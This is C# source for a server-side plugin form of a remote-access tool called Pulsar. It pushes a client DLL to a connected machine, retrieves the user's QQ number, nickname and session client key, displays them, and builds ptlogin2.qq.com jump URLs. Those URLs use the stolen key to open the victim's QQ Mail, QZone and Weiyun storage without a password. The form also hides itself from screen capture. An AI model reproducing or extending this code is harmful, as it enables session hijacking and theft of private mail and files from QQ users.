using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows.Forms;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;

namespace Pulsar.Server.Plugins.QQKey
{
    public partial class FrmQQKey : Form
    {
        private readonly Client _connectClient;
        private readonly QQKeyPlugin _plugin;

        private static readonly Dictionary<Client, FrmQQKey> OpenedForms = new();

        private string _uin;
        private string _clientKey;

        public static FrmQQKey CreateNewOrGetExisting(Client client, QQKeyPlugin plugin)
        {
            if (OpenedForms.TryGetValue(client, out var existingForm))
            {
                existingForm.Focus();
                return existingForm;
            }

            var form = new FrmQQKey(client, plugin);
            form.Disposed += (s, e) => OpenedForms.Remove(client);
            OpenedForms.Add(client, form);
            return form;
        }

        public FrmQQKey(Client client, QQKeyPlugin plugin)
        {
            _connectClient = client ?? throw new ArgumentNullException(nameof(client));
            _plugin = plugin;

            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            Pulsar.Server.Forms.ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            _connectClient.ClientState += ClientDisconnected;

            this.Text = WindowHelper.GetWindowTitle("QQ Key", _connectClient);

            // Disable buttons until data loaded
            btnMail.Enabled = false;
            btnQZone.Enabled = false;
            btnWeiyun.Enabled = false;
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            BeginLoadPlugin();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            _connectClient.ClientState -= ClientDisconnected;
            UniversalPluginResponseHandler.ResponseReceived -= OnClientResponse;
            base.OnFormClosing(e);
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
                SafeInvoke(Close);
        }

        private void SafeInvoke(Action action)
        {
            try
            {
                if (IsDisposed || !IsHandleCreated) return;
                if (InvokeRequired)
                    Invoke((MethodInvoker)(() => action()));
                else
                    action();
            }
            catch { }
        }

        #region Plugin lifecycle

        private void BeginLoadPlugin()
        {
            if (_plugin.GetClientDll() == null)
            {
                SetStatus("未找到客户端DLL");
                ShowFailed();
                return;
            }

            SetStatus("正在加载客户端插件...");

            PushSender.LoadUniversalPlugin(
                _connectClient,
                "QQKey.Client",
                _plugin.GetClientDll(),
                Array.Empty<byte>(),
                "Pulsar.Client.Plugins.QQKey.Client.QQKeyClientPlugin",
                "Initialize");

            UniversalPluginResponseHandler.ResponseReceived += OnClientResponse;
        }

        private void OnClientResponse(PluginResponse response)
        {
            if (response == null || response.PluginId != "QQKey.Client") return;
            if (response.Client != _connectClient) return;

            SafeInvoke(() =>
            {
                var message = response.Message ?? "";
                var command = response.Command ?? "";

                if (command == "load")
                {
                    if (response.Success)
                    {
                        SetStatus("插件已加载，正在获取QQ密钥...");
                        PushSender.ExecuteUniversalCommand(
                            _connectClient, "QQKey.Client", "GetQQKey", Array.Empty<byte>());
                    }
                    else
                    {
                        SetStatus($"插件加载失败：{message}");
                        ShowFailed();
                    }
                }
                else if (command == "GetQQKey")
                {
                    if (response.Success)
                    {
                        HandleQQKeyResponse(message);
                    }
                    else
                    {
                        SetStatus($"获取QQ密钥失败：{message}");
                        ShowFailed();
                    }
                }
            });
        }

        private void HandleQQKeyResponse(string data)
        {
            // Format: uin|clientkey|nickname|faceurl
            var parts = data.Split(new[] { '|' }, 4);
            if (parts.Length < 4)
            {
                SetStatus("客户端响应格式无效");
                ShowFailed();
                return;
            }

            _uin = parts[0];
            _clientKey = parts[1];
            var nickname = parts[2];
            var faceUrl = parts[3];

            lblQQ.Text = $"QQ号：{_uin}";
            lblNickname.Text = $"昵称：{nickname}";
            lblKey.Text = $"QQKey：{_clientKey}";

            // Load avatar async
            if (!string.IsNullOrEmpty(faceUrl))
            {
                _ = LoadAvatarAsync(faceUrl);
            }

            // Enable buttons
            btnMail.Enabled = true;
            btnQZone.Enabled = true;
            btnWeiyun.Enabled = true;

            SetStatus("QQ密钥加载成功");
        }

        private async Task LoadAvatarAsync(string url)
        {
            try
            {
                using (var client = new HttpClient())
                {
                    client.Timeout = TimeSpan.FromSeconds(10);
                    var bytes = await client.GetByteArrayAsync(url);
                    using (var ms = new MemoryStream(bytes))
                    {
                        var img = Image.FromStream(ms);
                        SafeInvoke(() =>
                        {
                            picAvatar.Image = img;
                        });
                    }
                }
            }
            catch
            {
                // Avatar load failed, ignore
            }
        }

        private void ShowFailed()
        {
            SafeInvoke(() =>
            {
                lblQQ.Text = "QQ号：获取失败";
                lblNickname.Text = "昵称：--";
                lblKey.Text = "QQKey：获取失败";
                picAvatar.Image = null;
                btnMail.Enabled = false;
                btnQZone.Enabled = false;
                btnWeiyun.Enabled = false;
            });
        }

        #endregion

        #region UI Actions

        private void SetStatus(string text)
        {
            SafeInvoke(() =>
            {
                lblStatus.Text = text;
            });
        }

        private void lblQQ_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(_uin) && _uin != "获取失败")
            {
                Clipboard.SetText(_uin);
                SetStatus("QQ号已复制到剪贴板");
            }
        }

        private void lblKey_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(_clientKey) && _clientKey != "获取失败")
            {
                Clipboard.SetText(_clientKey);
                SetStatus("QQKey已复制到剪贴板");
            }
        }

        private void btnQZone_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(_uin) || string.IsNullOrEmpty(_clientKey)) return;
            var url = $"https://ssl.ptlogin2.qq.com/jump?ptlang=1033&clientuin={_uin}&clientkey={_clientKey}&u1=https://user.qzone.qq.com/{_uin}/infocenter&keyindex=19";
            OpenUrl(url);
        }

        private void btnMail_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(_uin) || string.IsNullOrEmpty(_clientKey)) return;
            var url = $"https://ssl.ptlogin2.qq.com/jump?ptlang=1033&clientuin={_uin}&clientkey={_clientKey}&u1=https://wx.mail.qq.com/list/readtemplate?name=login_page.html&keyindex=19";
            OpenUrl(url);
        }

        private void btnWeiyun_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(_uin) || string.IsNullOrEmpty(_clientKey)) return;
            var url = $"https://ssl.ptlogin2.qq.com/jump?ptlang=1033&clientuin={_uin}&clientkey={_clientKey}&u1=https://www.weiyun.com&keyindex=19&pt_aid=527020901&daid=372";
            OpenUrl(url);
        }

        private void OpenUrl(string url)
        {
            try
            {
                Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });
            }
            catch (Exception ex)
            {
                MessageBox.Show($"打开链接失败：{ex.Message}", "QQ Key", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #endregion
    }
}
